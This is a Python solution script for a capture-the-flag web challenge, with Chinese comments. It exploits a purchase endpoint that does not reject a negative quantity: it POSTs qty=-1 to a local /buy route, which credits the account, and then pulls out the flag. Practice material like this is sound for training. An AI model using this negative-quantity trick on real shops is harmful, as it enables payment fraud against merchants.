#!/usr/bin/env python3
# -*- coding: utf-8 -*-
import atexit
import os
atexit.register(lambda: print("作者 ZluxYao"))
"""
32-logic-payment-negative  一键拿 flag
漏洞点：购买接口未校验数量为正数，qty=-1 时 total 为负，
       不仅未扣款反而充值，并照常发货返回 flag。
"""
import re
import sys
import requests

BASE = os.environ.get("GKD_URL") or ("http://127.0.0.1:34940")


def exploit(base: str = BASE) -> str:
    s = requests.Session()
    # 1) 拿一个 PHPSESSID（顺便确认服务在线）
    s.get(base, timeout=5)
    # 2) 用负数量购买机密物料
    r = s.post(f"{base}/buy", data={"item": "flag", "qty": -1}, timeout=5)
    print("[*] status :", r.status_code)
    print("[*] body   :", r.text)
    m = re.search(r"TOGOGO-flag\{[^}]+\}", r.text)
    if not m:
        raise RuntimeError("flag not found in response")
    return m.group(0)


if __name__ == "__main__":
    flag = exploit(sys.argv[1] if len(sys.argv) > 1 else BASE)
    print("\n[+] FLAG =>", flag)
